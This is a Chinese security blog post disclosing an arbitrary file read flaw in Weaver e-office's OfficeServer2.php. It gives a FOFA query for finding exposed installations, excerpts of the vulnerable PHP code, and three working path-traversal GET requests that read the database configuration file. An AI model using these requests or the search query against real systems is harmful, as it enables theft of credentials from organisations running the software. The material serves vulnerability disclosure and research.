---
title: "泛微e-office OfficeServer2.php 文件读取漏洞"
source: https://mrxn.net/jswz/eoffice-iWebOffice-OfficeServer2-fileread.html
asset_dir: assets/泛微e-office-officeserver2.php-文件读取漏洞
---

# 泛微e-office OfficeServer2.php 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/12 08:28
- 1090浏览
- [0评论](#comment)
- 30分钟阅读

深入探索

Docker加速服务

防火墙软件

企业安全咨询

---

# 漏洞简介

[泛微](https://mrxn.net/tag/泛微)E-Office是一款标准化的协同 OA 办公[软件](#)，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office `iWebOffice/OfficeServer2.php` 接口 `LOADFILE` 、`INSERTFILE` 和 `LOADTEMPLATE` 存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/漏洞)读取服务器上任意文件内容，造成敏感信息泄露。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语法

> `app="泛微-EOffice"`

# 漏洞分析

深入探索

恶意软件分析工具

安全运维咨询

漏洞扫描服务

## LOADFILE

```
$mFilePath = $_SERVER['DOCUMENT_ROOT']."attachment";
case "LOADFILE" :
    $mFileName = $_REQUEST['FILENAME'];
    $mRecordID = $_REQUEST['RECORDID'];
    $mFullPath = $mFilePath."/".$mRecordID."/".$mFileName;
    $mFullPath = ( "utf-8", "gbk", $mFullPath );
    $result = ( $mFullPath );
    if ( $result == false )
    {
        $MsgError = $_lang['file_file_not_exist'].$mFullPath;
    }
    else
    {
        $fd = ( $mFullPath, "rb" );
        $mFileSize = ( $mFullPath );
        $mFileBody = ( $fd, ( $mFullPath ) );
        ( $fd );
        $MsgObj = $MsgObj."STATUS=".( $_lang['file_open_success']."!" )."\r\n";
    }
    break;
```

深入探索

Nessus

JSON处理工具

授权

因 `FILENAME` 和 `RECORDID` 参数用户可控且无任何过滤或校验，导致可以拼接任意文件路径进行文件操作。

漏洞预警服务

## INSERTFILE

```
case "INSERTFILE" :
    $mFileName = $_REQUEST['FILENAME'];
    $mRecordID = $_REQUEST['RECORDID'];
    $mFullPath = $mFilePath."/".$mRecordID."/".$mFileName;
    $mFullPath = ( "utf-8", "gbk", $mFullPath );
    $result = ( $mFullPath );
    if ( !$result )
    {
        $MsgError = $_lang['file_file_not_exist'].$mFullPath;
    }
    else
    {
        $MsgObj = $MsgObj."POSITION=".( "Content" )."\r\n";
        $fd = ( $mFullPath, "rb" );
        $mFileSize = ( $mFullPath );
        $mFileBody = ( $fd, ( $mFullPath ) );
        ( $fd );
        $MsgObj = $MsgObj."STATUS=".( $_lang['file_open_success']."!" )."\r\n";
    }
    break;
```

## LOADTEMPLATE

```
case "LOADTEMPLATE" :
    $mTemplate = $TEMPLATE;
    $mFileType = $FILETYPE;
    $mCommand = $COMMAND;
    $mFileName = $FILENAME;
    $mFullPath = $mFilePath."/".$mTemplate.$mFileType;
    $mFullPath = ( "utf-8", "gbk", $mFullPath );
    if ( $mCommand == "INSERTFILE" )
    {
        $result = ( $mFullPath );
        $MsgObj = $MsgObj."result=".( "result" )."\r\n";
        if ( !$result )
        {
            $MsgError = $_lang['file_temp_not_exist']."File not exists".$mFullPath;
        }
        else
        {
            $fd = ( $mFullPath, "rb" );
            $mFileSize = ( $mFullPath );
            $mFileBody = ( $fd, ( $mFullPath ) );
            ( $fd );
            $MsgObj = $MsgObj."STATUS=".( $_lang['file_open_success']."!" )."\r\n";
        }
        $MsgObj = $MsgObj."PATH=".( $result )."\r\n";
    }
```

# 漏洞复现

## LOADFILE

```
GET /iWebOffice/OfficeServer2.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini HTTP/1.1
Host: eoffice.mrxn.net:8082
```

成功读取到 `mysql_config.ini` 文件数据库配置信息

物流软件安全

[![泛微e-office OfficeServer2.php 文件读取漏洞](images/img-001-eccdf0af5c0b.webp)](https://image.mrxn.net/068fed3161d84ffbbd238e7425589026.webp)

## INSERTFILE

```
GET /iWebOffice/OfficeServer2.php?OPTION=INSERTFILE&FILENAME=../mysql_config.ini HTTP/1.1
Host: eoffice.mrxn.net:8082
```

成功读取到 `mysql_config.ini` 文件数据库配置信息

商务软件和生产力软件

[![泛微e-office OfficeServer2.php 文件读取漏洞](images/img-002-9e4b8ea8c639.webp)](https://image.mrxn.net/7a4b05355f764b81ad1e470b6db7bb5c.webp)

## LOADTEMPLATE

```
GET /iWebOffice/OfficeServer2.php?OPTION=LOADTEMPLATE&COMMAND=INSERTFILE&TEMPLATE=../mysql_config.ini HTTP/1.1
Host: eoffice.mrxn.net:8082
```

成功读取到 `mysql_config.ini` 文件数据库配置信息

漏洞预警服务

[![泛微e-office OfficeServer2.php 文件读取漏洞](images/img-003-0d84c45fc1a6.webp)](https://image.mrxn.net/27b9d59548604f7fa4a7735711200ce4.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.LOADFILE](#toc-4-1-)
- [4.2.INSERTFILE](#toc-4-2-)
- [4.3.LOADTEMPLATE](#toc-4-3-)
- [5.漏洞复现](#toc-5-)
- [5.1.LOADFILE](#toc-5-1-)
- [5.2.INSERTFILE](#toc-5-2-)
- [5.3.LOADTEMPLATE](#toc-5-3-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
